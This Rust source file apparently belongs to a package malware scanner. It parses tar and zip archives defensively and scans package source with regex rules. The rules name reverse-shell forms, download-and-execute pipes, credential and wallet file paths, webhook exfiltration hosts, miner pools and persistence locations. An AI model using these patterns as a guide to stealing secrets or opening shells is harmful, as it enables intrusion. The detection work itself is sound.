    walk_tar_noted(path, container, budget, visit).map(|(pax, cut, _)| (pax, cut))
}

/// Like [`walk_tar_budget`], and says whether the gzip stream ended in bytes that
/// are not a gzip member (the third value).
fn walk_tar_noted(
    path: &Path,
    container: ContainerKind,
    budget: u64,
    visit: &mut dyn FnMut(TarItem<'_>) -> Result<bool>,
) -> Result<(usize, bool, bool)> {
    let (mut archive, exhausted, trailing) = tar_archive_budget(path, container, budget)?;
    let trailing_bytes = || trailing.load(std::sync::atomic::Ordering::Relaxed);
    let was_cut = || exhausted.load(std::sync::atomic::Ordering::Relaxed);
    let entries = archive
        .entries()
        .map_err(|_| anyhow::anyhow!("The file is not a readable tar archive"))?
        .raw(true);
    let mut long_name: Option<Vec<u8>> = None;
    let mut pax_name: Option<Vec<u8>> = None;
    let mut pax_size: Option<u64> = None;
    let mut pax_headers = 0usize;
    let mut extensions = 0usize;
    let mut extension_bytes = 0u64;
    let mut ordinal = 0usize;
    for entry in entries {
        let mut entry = match entry {
            Ok(entry) => entry,
            Err(_) if was_cut() => return Ok((pax_headers, true, trailing_bytes())),
            Err(_) => anyhow::bail!(TAR_DAMAGED),
        };
        let kind = entry.header().entry_type();
        let size = entry.size();
        if matches!(
            kind,
            tar::EntryType::GNULongName
                | tar::EntryType::GNULongLink
                | tar::EntryType::XHeader
                | tar::EntryType::XGlobalHeader
        ) {
            extensions += 1;
            if extensions > MAX_TAR_EXTENSIONS {
                anyhow::bail!(
                    "The tar archive has more than {MAX_TAR_EXTENSIONS} long-name or PAX header entries and was refused."
                );
            }
            if size > MAX_TAR_EXTENSION_BYTES {
                anyhow::bail!(
                    "The tar archive has a long-name or PAX header that declares {size} bytes (limit {MAX_TAR_EXTENSION_BYTES}); it was refused instead of being read into memory."
                );
            }
            extension_bytes = extension_bytes.saturating_add(size);
            if extension_bytes > MAX_TAR_EXTENSION_TOTAL {
                return Ok((pax_headers, true, trailing_bytes()));
            }
            let mut data = Vec::new();
            (&mut entry)
                .take(size)
                .read_to_end(&mut data)
                .map_err(|_| anyhow::anyhow!(TAR_DAMAGED))?;
            match kind {
                tar::EntryType::GNULongName => {
                    if long_name.is_some() {
                        anyhow::bail!(
                            "The tar archive has two GNU long-name headers in a row; other tar readers pick different names, so it was refused."
                        );
                    }
                    long_name = Some(cut_at_nul(data));
                }
                tar::EntryType::XHeader => {
                    pax_headers += 1;
                    // Consecutive PAX headers add up: a later one replaces only the
                    // keys it carries, as other tar readers do.
                    let (name, declared) = pax_records(&data).map_err(|()| {
                        anyhow::anyhow!(
                            "The tar archive has a PAX header that is not made of well-formed records; other tar readers parse it differently, so it was refused."
                        )
                    })?;
                    if name.is_some() {
                        pax_name = name.map(cut_at_nul);
                    }
                    if declared.is_some() {
                        pax_size = declared;
                    }
                }
                tar::EntryType::XGlobalHeader => {
                    pax_headers += 1;
                    let declared = pax_records(&data).map_err(|()| {
                        anyhow::anyhow!(
                            "The tar archive has a global PAX header that is not made of well-formed records; other tar readers parse it differently, so it was refused."
                        )
                    })?;
                    if declared.0.is_some() {
                        anyhow::bail!(
                            "The tar archive has a global PAX header that sets a path for every entry; other tar readers name files differently from it, so it was refused."
                        );
                    }
                    if declared.1.is_some() {
                        anyhow::bail!(
                            "The tar archive has a global PAX header that sets a size for every entry; other tar readers extract different files from it, so it was refused."
                        );
                    }
                }
                _ => {}
            }
            continue;
        }
        // npm, bsdtar and Python give the PAX `size` precedence over the header's.
        // This reader walks the raw headers, so a file whose two sizes differ would
        // be read at the wrong offset and hide the entries behind it.
        if let Some(declared) = pax_size.take() {
            if declared != size {
                anyhow::bail!(
                    "The tar archive has an entry whose PAX size ({declared}) differs from its header size ({size}); other tar readers extract different files from it, so it was refused."
                );
            }
        }
        // A PAX path and a GNU long name on one entry: which one wins differs
        // between readers, and no packer writes both.
        if pax_name.is_some() && long_name.is_some() {
            anyhow::bail!(
                "The tar archive has an entry with both a PAX path and a GNU long name; other tar readers pick different names, so it was refused."
            );
        }
        let raw_name = cut_at_nul(
            pax_name
                .take()
                .or_else(|| long_name.take())
                .unwrap_or_else(|| entry.path_bytes().into_owned()),
        );
        long_name = None;
        // Directories, links and devices have no data in npm's tar, bsdtar and
        // Python, but this raw reader would skip `size` bytes and so hide the
        // entries inside them. A regular entry whose resolved name ends in a slash
        // is a directory to them and the same.
        if size > 0 && (!kind.is_file() || raw_name.ends_with(b"/")) {
            anyhow::bail!(
                "The tar archive has a directory, link or device entry that declares {size} bytes of data; other tar readers extract different files from it, so it was refused."
            );
        }
        let link = entry
            .link_name_bytes()
            .map(|bytes| String::from_utf8_lossy(&bytes).into_owned());
        let item = TarItem {
            ordinal,
            path: String::from_utf8_lossy(&raw_name).into_owned(),
            kind,
            size,
            link,
            reader: &mut entry,
        };
        ordinal += 1;
        if !visit(item)? {
            break;
        }
    }
    Ok((pax_headers, was_cut(), trailing_bytes()))
}

fn list_tar(
    path: &Path,
    container: ContainerKind,
    notes: &mut Vec<String>,
    unsafe_entries: &mut Vec<UnsafeEntry>,
) -> Result<Listing> {
    let mut listed = Vec::new();
    let mut truncated = false;
    let mut ignored = 0usize;
    let mut declared = 0u64;
    let mut visited = 0usize;
    let (pax_ignored, stopped, trailing) =
        walk_tar_noted(path, container, MAX_TAR_STREAM_BYTES, &mut |item| {
            visited += 1;
            if visited > MAX_VISITED_ENTRIES {
                truncated = true;
                return Ok(false);
            }
            // Every entry's data is skipped through (and decompressed), so every
            // declared size counts toward the work limit, not only regular files.
            declared = declared.saturating_add(item.size);
            if declared > MAX_DECLARED_BYTES {
                truncated = true;
                return Ok(false);
            }
            if unsafe_entries.len() < MAX_UNSAFE_ENTRIES {
                unsafe_entries.extend(classify_unsafe(&item.path, item.kind, item.link.clone()));
            }
            if !item.kind.is_file() {
                // Directories, links and devices carry no package content.
                return Ok(true);
            }
            let normalised = normalise_entry_path(&item.path);
            if is_metadata_entry(&normalised) {
                let head = read_head(item.reader);
                if is_appledouble(&normalised, &head) {
                    ignored += 1;
                    return Ok(true);
                }
            }
            if listed.len() >= MAX_LISTED_ENTRIES {
                truncated = true;
                return Ok(false);
            }
            let raw = unsafe_path_kind(&item.path).map(|_| item.path.clone());
            listed.push(Listed {
                path: normalised,
                size: item.size,
                ordinal: item.ordinal,
                raw,
            });
            Ok(true)
        })?;
    if trailing {
        notes.push("the file has bytes after its last gzip member that are not gzip data; they were ignored, as gzip does".to_string());
    }
    ignored += pax_ignored;
    // The long-name and PAX header budget ran out: the rest was not listed.
    truncated |= stopped;
    Ok((listed, truncated, ignored))
}

fn read_tar_files(
    path: &Path,
    container: ContainerKind,
    want: &HashSet<usize>,
) -> Result<HashMap<usize, Vec<u8>>> {
    let mut out = HashMap::new();
    if want.is_empty() {
        return Ok(out);
    }
    let last = want.iter().copied().max().unwrap_or(0);
    walk_tar(path, container, &mut |item| {
        if item.ordinal > last {
            return Ok(false);
        }
        if !want.contains(&item.ordinal) {
            return Ok(true);
        }
        let mut buf = Vec::new();
        item.reader
            .take(MAX_MANIFEST_BYTES.max(MAX_FILE_BYTES) as u64)
            .read_to_end(&mut buf)
            .map_err(|_| anyhow::anyhow!(TAR_DAMAGED))?;
        out.insert(item.ordinal, buf);
        Ok(true)
    })?;
    Ok(out)
}

fn list_zip(path: &Path, unsafe_entries: &mut Vec<UnsafeEntry>) -> Result<Listing> {
    let file = File::open(path).with_context(|| format!("Cannot open {}", path.display()))?;
    let mut zip = zip::ZipArchive::new(file).context("The file is not a readable zip archive")?;
    let mut listed = Vec::new();
    let mut truncated = false;
    let mut ignored = 0usize;
    let mut declared = 0u64;
    for index in 0..zip.len().min(MAX_VISITED_ENTRIES) {
        let mut entry = zip.by_index(index)?;
        if entry.is_dir() {
            continue;
        }
        if unsafe_entries.len() < MAX_UNSAFE_ENTRIES {
            let raw = entry.name()?.to_string();
            if let Some(kind) = unsafe_path_kind(&raw) {
                unsafe_entries.push(UnsafeEntry {
                    path: raw,
                    kind,
                    target: None,
                });
            }
        }
        let name = normalise_entry_path(&entry.name()?);
        if is_metadata_entry(&name) {
            let head = read_head(&mut entry);
            if is_appledouble(&name, &head) {
                ignored += 1;
                continue;
            }
        }
        if listed.len() >= MAX_LISTED_ENTRIES {
            truncated = true;
            break;
        }
        declared = declared.saturating_add(entry.size());
        if declared > MAX_DECLARED_BYTES {
            truncated = true;
            break;
        }
        listed.push(Listed {
            path: name,
            size: entry.size(),
            ordinal: index,
            raw: None,
        });
    }
    if zip.len() > MAX_VISITED_ENTRIES {
        truncated = true;
    }
    Ok((listed, truncated, ignored))
}

fn read_zip_files(path: &Path, want: &HashSet<usize>) -> Result<HashMap<usize, Vec<u8>>> {
    let mut out = HashMap::new();
    if want.is_empty() {
        return Ok(out);
    }
    let file = File::open(path).with_context(|| format!("Cannot open {}", path.display()))?;
    let mut zip = zip::ZipArchive::new(file)?;
    for &index in want {
        let Ok(entry) = zip.by_index(index) else {
            continue;
        };
        let mut buf = Vec::new();
        if entry
            .take(MAX_MANIFEST_BYTES.max(MAX_FILE_BYTES) as u64)
            .read_to_end(&mut buf)
            .is_ok()
        {
            out.insert(index, buf);
        }
    }
    Ok(out)
}

/// Pick the manifest closest to the package root: depth 0 or 1, never inside
/// `node_modules`, `tests`, fixtures and the like.
///
/// For a directory, `<root>/name` wins and `<top>/name` is the fallback
/// (`preferred_top` first). For a tarball `npm install` strips the first path
/// component of every entry, so a root-level file is dropped and the last
/// `<top>/name` entry in archive order wins; a depth-0 file is used only when
/// no `<top>/name` exists.
pub fn root_manifest<'a>(
    files: &'a [LoadedFile],
    file_name: &str,
    preferred_top: &str,
    tarball: bool,
) -> Option<&'a LoadedFile> {
    let matches = |f: &&LoadedFile| {
        let parts: Vec<&str> = f.path.split('/').collect();
        parts.last() == Some(&file_name) && parts.len() <= 2
    };
    if tarball {
        if let Some(last) = files
            .iter()
            .rev()
            .filter(matches)
            .find(|f| f.path.contains('/'))
        {
            return Some(last);
        }
        return files.iter().rev().find(|f| f.path == file_name);
    }
    let mut candidates: Vec<&LoadedFile> = files.iter().filter(matches).collect();
    candidates.sort_by_key(|f| {
        let depth = f.path.matches('/').count();
        let preferred = f.path.split('/').next() == Some(preferred_top) && depth == 1;
        (depth, !preferred, f.path.clone())
    });
    // A later duplicate of the same path replaces the earlier one.
    let first = candidates.first()?;
    files.iter().rev().find(|f| f.path == first.path)
}

/// Other manifests of the same name at depth 0 or 1 that were not chosen:
/// a package with several candidates is worth a second look.
pub fn competing_manifests(files: &[LoadedFile], file_name: &str, chosen: &str) -> Vec<String> {
    let mut others: Vec<String> = files
        .iter()
        .filter(|f| {
            let parts: Vec<&str> = f.path.split('/').collect();
            parts.last() == Some(&file_name) && parts.len() <= 2 && f.path != chosen
        })
        .map(|f| f.path.clone())
        .collect();
    others.sort();
    others.dedup();
    others
}

// ---------------------------------------------------------------------------
// Source scanning
// ---------------------------------------------------------------------------

/// Language families the scanner knows.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Lang {
    /// JavaScript and TypeScript.
    Js,
    /// Python.
    Python,
    /// Shell, batch and PowerShell.
    Shell,
}

/// One suspicious construct, with where it is.
#[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]
pub struct SourceFinding {
    /// What was recognised.
    pub rule: String,
    /// Group of rules: download-exec, credential-theft, exfiltration, cryptomining,
    /// backdoor, code-exec, process-exec, obfuscation, persistence, network.
    pub category: String,
    /// Critical, High, Medium or Low.
    pub severity: String,
    /// Path inside the package.
    pub file: String,
    /// 1-based line number.
    pub line: usize,
    /// The matching text with a little context, at most 160 characters.
    pub evidence: String,
    /// Found on a line that looks like a comment or docstring. The severity is
    /// already lowered one step; such a finding never lifts a package to High
    /// on its own (a usage example in documentation is not an attack).
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub in_comment: bool,
}

/// What scanning one file produced.
#[derive(Debug, Default, Clone)]
pub struct FileScan {
    /// Findings, at most a few per rule.
    pub findings: Vec<SourceFinding>,
    /// Shannon entropy of the bytes, 0 to 8.
    pub entropy: f32,
    /// 0 to 1.
    pub obfuscation_score: f32,
    /// Python: top-level modules imported.
    pub imports: Vec<String>,
    /// Suspicious URLs found (anonymous file hosts, webhooks, ...).
    pub suspicious_urls: Vec<(String, usize)>,
}

struct Rule {
    name: &'static str,
    category: &'static str,
    severity: &'static str,
    langs: &'static [Lang],
    regex: Regex,
}

const ALL: &[Lang] = &[Lang::Js, Lang::Python, Lang::Shell];
const JS: &[Lang] = &[Lang::Js];
const PY: &[Lang] = &[Lang::Python];

fn rules() -> &'static Vec<Rule> {
    static RULES: OnceLock<Vec<Rule>> = OnceLock::new();
    RULES.get_or_init(|| {
        let table: &[(&str, &str, &str, &[Lang], &str)] = &[
            (
                "Download piped to a shell or interpreter",
                "download-exec",
                "Critical",
                ALL,
                r#"(?i)(\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?((ba|z|da)?sh|python[\d.]*|node|perl|ruby)\b|\b(ba|z|da)?sh\s+-c\s+["']?\$\(\s*(curl|wget)\b|\b(iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b[^\n|]*\|\s*iex\b|\biex\s*\(?[^\n]*DownloadString)"#,
            ),
            (
                "Download, then run",
                "download-exec",
                "High",
                ALL,
                r"(?i)\b(curl|wget)\b[^\n]*(-o|-O|>)\s*\S+[^\n]*(;|&&)\s*(chmod\s+\+x|sh\s|bash\s|\./)",
            ),
            (
                "Private key or cloud credential file",
                "credential-theft",
                "High",
                ALL,
                r"(\.ssh/(id_[a-z0-9_]+|authorized_keys)|\.aws/credentials|/etc/shadow|\.kube/config|wallet\.dat|\.git-credentials|Login Data|Cookies\.sqlite|logins\.json|nkbihfbeogaeaoehlefnkodbefgpgknn)",
            ),
            (
                "Registry or system credential file reference",
                "credential-theft",
                "Medium",
                ALL,
                r"(\.npmrc\b|\.pypirc\b|\.netrc\b|/etc/passwd|\.bash_history|\.docker/config\.json)",
            ),
            (
                "Exfiltration endpoint",
                "exfiltration",
                "High",
                ALL,
                r"(?i)(discord(app)?\.com/api/webhooks|api\.telegram\.org/bot|hooks\.slack\.com/services|webhook\.site|requestbin\.|pipedream\.net|\.ngrok(-free)?\.(io|app|dev)|oast\.(pro|live|site|online|fun|me)|interact\.sh|burpcollaborator\.net)",
            ),
            (
                "Anonymous file host",
                "network",
                "Medium",
                ALL,
                r"(?i)(transfer\.sh|pastebin\.com/(raw|api)|anonfiles|temp\.sh|file\.io/)",
            ),
            (
                "Cryptominer indicator",
                "cryptomining",
                "Critical",
                ALL,
                r"(?i)(stratum\+(tcp|ssl|tls)://|\bcryptonight\b|coinhive|coin-hive|crypto-?loot|\bxmrig\b|minexmr|supportxmr|nanopool\.org|moneroocean|hashvault\.pro)",
            ),
            (
                "Reverse shell",
                "backdoor",
                "Critical",
                ALL,
                r"(/dev/tcp/\S+|\bnc(at)?\s+(-\w+\s+)*-e\s|\bbash\s+-i\s*>&|\bmkfifo\b[^\n]*\bnc\b|\bsocat\b[^\n]*exec:|/bin/(ba)?sh\s+-i\b)",
            ),
            (
                "Persistence mechanism",
                "persistence",
                "High",
                ALL,
                r"(\.(bashrc|zshrc|bash_profile|zprofile)\b|/etc/cron|\bcrontab\s+-|LaunchAgents|\.config/autostart|systemctl\s+enable|\bschtasks\b)",
            ),
            // JavaScript
            (
                "Process execution module",
                "process-exec",
                "Medium",
                JS,
                r#"(require\s*\(\s*['"](node:)?child_process['"]\s*\)|from\s+['"](node:)?child_process['"]|\bchild_process\.(exec|execSync|spawn|spawnSync|execFile|execFileSync|fork)\s*\()"#,
            ),
            (
                "Eval of decoded payload",
                "obfuscation",
                "High",
                JS,
                r"(\beval\s*\(\s*(Buffer\.from|atob|unescape|decodeURIComponent|String\.fromCharCode)|\beval\s*\([^\n]{0,80}(base64|atob\()|new\s+Function\s*\([^\n]{0,80}(base64|atob\(|Buffer\.from)|Function\s*\(\s*atob)",
            ),
            (
                "Dynamic code evaluation",
                "code-exec",
                "Medium",
                JS,
                r"((^|[^.\w$])eval\s*\(|new\s+Function\s*\(|\bvm\.run(InNewContext|InThisContext|InContext)\s*\()",
            ),
            (
                "Environment sent over the network",
                "exfiltration",
                "High",
                JS,
                r"(process\.env[^\n]{0,200}(https?://|fetch\(|\.post\(|axios|https?\.request|\.send\()|(fetch\(|axios[.(]|https?\.request\(|\.post\()[^\n]{0,200}process\.env)",
            ),
            (
                "Environment dump",
                "exfiltration",
                "Medium",
                JS,
                r"(JSON\.stringify\(\s*process\.env\s*\)|Object\.(keys|entries|values)\(\s*process\.env\s*\))",
            ),
            (
                "Obfuscator identifiers",
                "obfuscation",
                "Medium",
                JS,
                r"\b_0x[0-9a-f]{4,6}\b",
            ),
            (
                "Escaped or char-code string blob",
                "obfuscation",
                "Medium",
                JS,
                r"((\\x[0-9a-fA-F]{2}){12,}|fromCharCode\(\s*(\d+\s*,\s*){10,})",
            ),
            // Python
            (
                "Process execution",
                "process-exec",
                "Medium",
                PY,
                r"\b(subprocess\.(call|run|Popen|check_output|check_call|getoutput)|os\.(system|popen|execl|execv|execlp|execvp)|pty\.spawn|commands\.getoutput)\s*\(",
            ),
            (
                "Exec of decoded payload",
                "obfuscation",
                "High",
                PY,
                r"(\b(exec|eval)\s*\(\s*(base64\.|zlib\.|codecs\.|marshal\.|bytes\.fromhex|binascii\.|bz2\.|lzma\.|__import__\()|\b(exec|eval)\s*\([^\n]{0,120}(b64decode|decompress|marshal\.loads|unhexlify|fromhex))",
            ),
            (
                "Dynamic code execution",
                "code-exec",
                "Medium",
                PY,
                r"((^|[^.\w])(exec|eval)\s*\()",
            ),
            (
                "Dynamic import of an encoding module",
                "obfuscation",
                "Medium",
                PY,
                r#"__import__\(\s*['"](base64|zlib|marshal|codecs)['"]\s*\)"#,
            ),
            (
                "Environment sent over the network",
                "exfiltration",
                "High",
                PY,
                r"((os\.environ|os\.getenv)[^\n]{0,200}(requests\.|urlopen|urllib|httpx|http\.client|socket)|(requests\.(post|get|put)|urlopen|urllib\.request\.\w+|httpx\.\w+)\([^\n]{0,200}os\.environ)",
            ),
            (
                "Environment dump",
                "exfiltration",
                "Medium",
                PY,
                r"json\.dumps\(\s*(dict\()?os\.environ",
            ),
            (
                "Socket redirected to stdio",
                "backdoor",
                "Critical",
                PY,
                r"dup2\(\s*(s|c|sock\w*|conn\w*|client\w*|\w*socket\w*|\w*\.sock\w*)\.fileno\(\)\s*,\s*([012]\b|sys\.std)",
            ),
            (
                "Char-code string assembly",
                "obfuscation",
                "Medium",
                PY,
                r"((chr\(\d+\)\s*\+\s*){4,}|(\\x[0-9a-fA-F]{2}){12,})",
            ),
        ];
        table
            .iter()
            .map(|&(name, category, severity, langs, pattern)| Rule {
                name,
                category,
                severity,
                langs,
                regex: Regex::new(pattern).expect("package scan rule compiles"),
            })
            .collect()
    })
}

fn url_regex() -> &'static Regex {
    static URL: OnceLock<Regex> = OnceLock::new();
    URL.get_or_init(|| Regex::new(r#"https?://[^\s"'<>)\\`]+"#).expect("url regex"))
}

/// URLs on hosts commonly used to stage or receive data.
pub fn is_suspicious_url(url: &str) -> bool {
    const HOSTS: &[&str] = &[
        "pastebin.com",
        "transfer.sh",
        "file.io",
        "temp.sh",
        "ngrok.io",
        "webhook.site",
        "discord.com/api/webhooks",
        "discordapp.com/api/webhooks",
        "api.telegram.org/bot",
        "hooks.slack.com/services",
        "interact.sh",
    ];
    HOSTS.iter().any(|host| url.contains(host))
}

/// Language of a file by name, when the scanner reads it.
pub fn language_of(path: &str) -> Option<Lang> {
    let lower = path.to_ascii_lowercase();
    let ext = lower.rsplit('.').next().unwrap_or("");
    match ext {
        "js" | "mjs" | "cjs" | "jsx" | "ts" | "tsx" | "mts" | "cts" => Some(Lang::Js),
        "py" | "pyw" | "pth" => Some(Lang::Python),
        "sh" | "bash" | "zsh" | "cmd" | "bat" | "ps1" => Some(Lang::Shell),
        _ => None,
    }
}

/// Shannon entropy of `bytes`, 0 to 8.
pub fn shannon_entropy(bytes: &[u8]) -> f32 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }
    let len = bytes.len() as f64;
    let entropy: f64 = counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / len;
            -p * p.log2()
        })
        .sum();
    entropy as f32
}

fn evidence_window(line: &str, start: usize, end: usize) -> String {
    const SIDE: usize = 50;
    let mut from = start.saturating_sub(SIDE);
    while from > 0 && !line.is_char_boundary(from) {
        from -= 1;
    }
    let mut to = (end + SIDE).min(line.len());
    while to < line.len() && !line.is_char_boundary(to) {
        to += 1;
    }
    let mut text: String = line[from..to].trim().chars().take(160).collect();
    if from > 0 {
        text.insert(0, '…');
    }
    if to < line.len() {
        text.push('…');
    }
    text
}

fn import_regex() -> &'static Regex {
    static IMPORT: OnceLock<Regex> = OnceLock::new();
    IMPORT.get_or_init(|| {
        Regex::new(r"^\s*(?:from\s+([A-Za-z_][\w]*)[\w.]*\s+import|import\s+([A-Za-z_][\w., ]*))")
            .expect("import regex")
    })
}

/// Split source text into lines the way the language does: JavaScript ends a
/// line at LF, CRLF, a lone CR, U+2028 and U+2029; Python and shell at LF, CRLF
/// and a lone CR (shell does not, but reading more lines only finds more). A
/// `//` or `#` comment ends at any of them, and the text after is code.
fn source_lines(text: &str, lang: Lang) -> Vec<&str> {
    let bytes = text.as_bytes();
    let mut out = Vec::new();
    let mut start = 0;
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\n' => {
                out.push(&text[start..i]);
                i += 1;
                start = i;
            }
            b'\r' => {
                out.push(&text[start..i]);
                i += 1;
                if bytes.get(i) == Some(&b'\n') {
                    i += 1;
                }
                start = i;
            }
            0xE2 if lang == Lang::Js
                && matches!(bytes.get(i + 1..i + 3), Some([0x80, 0xA8 | 0xA9])) =>
            {
                out.push(&text[start..i]);
                i += 3;
                start = i;
            }
            _ => i += 1,
        }
    }
    if start < bytes.len() {
        out.push(&text[start..]);
    }
    out
}

/// True when one of the first two lines of a Python file declares a source
/// encoding other than the ordinary ones (PEP 263), such as `unicode_escape`,
/// which makes the interpreter read `\u000a` inside a comment as a newline.
fn declares_exotic_encoding(text: &str) -> bool {
    text.lines().take(2).any(|line| {
        let line = line.trim_start();
        if !line.starts_with('#') {
            return false;
        }
        // PEP 263: the first `coding` that is followed at once by `:` or `=`.
        let Some(rest) = line.match_indices("coding").find_map(|(at, _)| {
            let after = &line[at + 6..];
            after
                .strip_prefix([':', '='])
                .map(|r| r.trim_start_matches([' ', '\t']))
        }) else {
            return false;
        };
        let name: String = rest
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
            .collect::<String>()
            .to_ascii_lowercase()
            .replace('_', "-");
        !name.is_empty()
            && !matches!(
                name.as_str(),
                "utf-8" | "utf8" | "ascii" | "us-ascii" | "latin-1" | "latin1" | "iso-8859-1"
            )
    })
}

/// Scan one source file.
pub fn scan_source(lang: Lang, path: &str, bytes: &[u8]) -> FileScan {
    let text = String::from_utf8_lossy(bytes);
    let basename = path.rsplit('/').next().unwrap_or(path);
    let is_setup = basename == "setup.py";
    let is_pth = path.ends_with(".pth");
    let mut scan = FileScan {
        entropy: shannon_entropy(bytes),
        ..FileScan::default()
    };
    // Declaration files hold no executable code in normal use, but Node runs
    // whatever a `require('./types.d.ts')` loads, so they are scanned with the
    // High and Critical rules; only the noisy Medium rules are left out.
    let declaration = lang == Lang::Js && is_declaration_file(path);
    let mut tracker = CommentTracker::new(lang);
    tracker.no_doc = lang == Lang::Python && text.contains("__doc__");
    let mut per_rule: HashMap<&'static str, usize> = HashMap::new();
    let mut imports: BTreeSet<String> = BTreeSet::new();
    let applicable: Vec<&Rule> = rules()
        .iter()
        .filter(|rule| rule.langs.contains(&lang))
        .collect();
    let mut obfuscation_hits = 0usize;
    let mut max_line = 0usize;
    // Findings on lines that look like comments, kept apart so documentation
    // cannot use up the caps meant for code.
    let mut comment_scan = FileScan::default();
    let mut comment_per_rule: HashMap<&'static str, usize> = HashMap::new();
    // A Python file that declares an exotic source encoding (`unicode_escape`)
    // can turn the text of a comment into code: no line is trusted as comment.
    let distrust_comments = lang == Lang::Python && declares_exotic_encoding(&text);
    // Lines that are code, and the first read of a credential file, for the
    // whole-file checks that follow the line loop.
    let mut code_lines: Vec<(usize, &str)> = Vec::new();
    let mut credential_read: Option<(usize, &str)> = None;

    for (index, line) in source_lines(&text, lang).into_iter().enumerate() {
        let number = index + 1;
        max_line = max_line.max(line.len());
        if lang == Lang::Python {
            if let Some(caps) = import_regex().captures(line) {
                if let Some(module) = caps.get(1) {
                    imports.insert(module.as_str().to_string());
                } else if let Some(list) = caps.get(2) {
                    for part in list.as_str().split(',') {
                        let top = part.trim().split([' ', '.']).next().unwrap_or("");
                        if !top.is_empty() {
                            imports.insert(top.to_string());
                        }
                    }
                }
            }
        }
        let trimmed = line.trim_start();
        let comment = tracker.line_is_comment(line) && !distrust_comments;
        if !comment {
            code_lines.push((number, line));
        }
        if is_pth && trimmed.starts_with("import ") {
            push_finding(
                &mut scan,
                &mut per_rule,
                "Executable .pth line",
                "persistence",
                "High",
                path,
                number,
                line,
                0,
                line.len(),
                false,
            );
        }
        if is_setup {
            if let Some(m) = setup_network_regex().find(line) {
                if !comment {
                    push_finding(
                        &mut scan,
                        &mut per_rule,
                        "Network access in setup.py",
                        "network",
                        "Medium",
                        path,
                        number,
                        line,
                        m.start(),
                        m.end(),
                        false,
                    );
                }
            }
        }
        for rule in &applicable {
            // Critical rules read every line. Comment context only lowers such a
            // finding by one step: what the tracker takes for a comment is a guess
            // the runtime may not share. The other rules skip comment lines.
            let severity = if comment {
                match rule.severity {
                    "Critical" => "High",
                    _ => continue,
                }
            } else {
                rule.severity
            };
            if declaration && !matches!(rule.severity, "Critical" | "High") {
                continue;
            }
            if let Some(m) = rule.regex.find(line) {
                if !match_is_credible(rule, line, m.as_str()) {
                    continue;
                }
                if rule.category == "obfuscation" && !comment {
                    obfuscation_hits += 1;
                }
                if rule.category == "credential-theft"
                    && !comment
                    && credential_read.is_none()
                    && access_context_regex().is_match(line)
                {
                    credential_read = Some((number, line));
                }
                let (target, counts) = if comment {
                    (&mut comment_scan, &mut comment_per_rule)
                } else {
                    (&mut scan, &mut per_rule)
                };
                push_finding(
                    target,
                    counts,
                    rule.name,
                    rule.category,
                    severity,
                    path,
                    number,
                    line,
                    m.start(),
                    m.end(),
                    comment,
                );
            }
        }
        if line.contains("http") {
            for m in url_regex().find_iter(line).take(5) {
                let url = m.as_str();
                if is_suspicious_url(url) && scan.suspicious_urls.len() < 20 {
                    scan.suspicious_urls.push((url.to_string(), number));
                }
            }
        }
    }

    if lang != Lang::Shell {
        correlate_file(
            lang,
            is_setup,
            path,
            &code_lines,
            credential_read,
            &mut scan,
            &mut per_rule,
        );
    }

    let mut score = 0.35 * (obfuscation_hits.min(3) as f32);
    if scan.entropy > 5.9 && bytes.len() > 2048 {
        score += 0.3;
    }
    if max_line > 20_000 && scan.entropy > 5.5 {
        score += 0.2;
    }
    scan.obfuscation_score = score.min(1.0);
    for mut finding in comment_scan.findings {
        if scan.findings.len() >= MAX_PER_FILE {
            break;
        }
        finding.evidence = format!("(in a comment or docstring) {}", finding.evidence);
        scan.findings.push(finding);
    }
    scan.imports = imports.into_iter().take(40).collect();
    scan
}

/// Block comments longer than this many lines are scanned as code: an
/// unterminated `/*` (or one inside a string) must not silence a whole file.
const MAX_BLOCK_COMMENT_LINES: usize = 400;

/// Which lines of a file are only comment. A comment opener counts only where the
/// language would read it as one: not inside a string, a template literal, a
/// triple-quoted string or a regular expression, which may span lines. A line
/// that starts inside such a string is code. A line whose comment is followed by
/// code (`/**/ eval(...)`) is code too: the code after the comment runs.
struct CommentTracker {
    lang: Lang,
    /// JavaScript: inside `/* ... */`, and for how many lines.
    in_block: bool,
    block_lines: usize,
    /// JavaScript: open template literals; each entry is the brace depth of the
    /// `${ ... }` being read inside it, or `None` while in the literal's text.
    templates: Vec<Option<usize>>,
    /// JavaScript: last significant byte, to tell a regex from a division.
    prev: u8,
    /// Python: the open triple quote. Shell: the open quote (single or double).
    quote: Option<(u8, bool)>,
    /// JavaScript: a block comment that opened after code on its line. A regex
    /// literal read as a division looks exactly like that, so its lines count as
    /// code: a real comment of that shape is rare, a faked one hides a payload.
    block_untrusted: bool,
    /// JavaScript: a quoted string that continues on the next line (backslash at
    /// the end of the line).
    string_cont: Option<u8>,
    /// Python and shell: the previous line ended in a backslash.
    joined: bool,
    /// Python: the open triple-quoted string started a statement of its own (a
    /// docstring), so its lines are documentation, not code.
    doc: bool,
    /// Python: the file runs its own docstring (`__doc__`): none counts as one.
    no_doc: bool,
    /// Python: a line of code was seen, and whether the last one ended in `:`.
    seen_code: bool,
    last_colon: bool,
    /// Python: open brackets, to tell a statement start from a continuation.
    depth: usize,
    /// JavaScript: the tracker had to guess (a regex with no closing slash, a
    /// string that does not close). Past a guess nothing is trusted as comment:
    /// the guess may have swallowed a template literal or a quote, and the
    /// runtime would read the next lines differently.
    uncertain: bool,
}

impl CommentTracker {
    fn new(lang: Lang) -> Self {
        Self {
            lang,
            in_block: false,
            block_lines: 0,
            templates: Vec::new(),
            prev: b'(',
            quote: None,
            block_untrusted: false,
            string_cont: None,
            joined: false,
            doc: false,
            depth: 0,
            uncertain: false,
            no_doc: false,
            seen_code: false,
            last_colon: false,
        }
    }

    fn line_is_comment(&mut self, line: &str) -> bool {
        match self.lang {
            Lang::Js => self.js_line(line),
            Lang::Python => self.hash_line(line, true),
            Lang::Shell => self.hash_line(line, false),
        }
    }

    /// Python (triple quotes can span lines) and shell (single and double quotes
    /// can span lines).
